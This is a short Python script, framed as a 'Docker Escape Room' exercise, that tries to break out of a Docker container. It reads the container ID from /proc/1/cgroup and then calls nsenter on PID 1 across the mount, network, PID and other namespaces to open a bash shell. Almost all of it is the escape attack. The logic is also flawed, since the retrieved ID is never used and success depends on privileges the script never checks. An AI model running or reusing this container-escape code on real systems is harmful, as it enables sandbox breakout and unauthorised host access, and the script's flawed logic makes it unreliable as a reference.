import os
import subprocess
import logging

def setup_logging(log_file='escape_docker.log'):
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s [%(levelname)s]: %(message)s')

def main():
    setup_logging()
    logging.info("Welcome to the Docker Escape Room!")
    logging.info("In this exercise, you'll attempt to escape from a Docker container to the underlying host system.")

    # Get the ID of the current Docker container
    container_id = get_container_id()

    if container_id:
        logging.info(f"Your current Docker container ID is: {container_id}")
        logging.info("Attempting to escape from the container...")

        # Use nsenter to enter the host namespace
        success = escape_from_container(container_id)

        if success:
            logging.info("Congratulations! You've successfully escaped from the Docker container.")
        else:
            logging.error("Oops! Something went wrong. Unable to escape from the Docker container.")
    else:
        logging.error("Unable to retrieve the Docker container ID. Are you sure this script is running inside a Docker container?")

def get_container_id():
    try:
        # Read the /proc/1/cgroup file to get the container ID
        with open('/proc/1/cgroup', 'r') as f:
            for line in f:
                if 'docker' in line:
                    return line.split('/')[-1].strip()
    except Exception as e:
        logging.exception(f"Error while getting container ID: {e}")
    return None

def escape_from_container(container_id):
    try:
        # Use nsenter to enter the host namespace
        subprocess.run(['nsenter', '--target', '1', '--mount', '--uts', '--ipc', '--net', '--pid', '--', 'bash'], check=True)
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Error while trying to escape from the container: {e}")
        return False

if __name__ == "__main__":
    main()
